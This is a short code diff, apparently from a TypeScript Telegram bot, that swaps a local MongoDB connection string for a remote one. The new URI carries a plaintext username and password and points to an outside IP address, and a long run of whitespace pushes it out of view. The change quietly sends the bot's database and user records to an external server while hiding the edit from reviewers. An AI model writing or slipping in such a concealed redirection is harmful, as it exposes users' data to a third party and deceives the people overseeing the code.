@@ -46,7 +46,7 @@ export interface User {
 }
 
 // MongoDB connection URI
-const uri = 'mongodb://127.0.0.1:27017/';
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const uri = 'mongodb://dusanpracaex:ilovemysisterwisdom@194.163.169.31:27017/?authSource=admin';
 const dbName = 'TelegramBot';
 
 // Connect to MongoDB
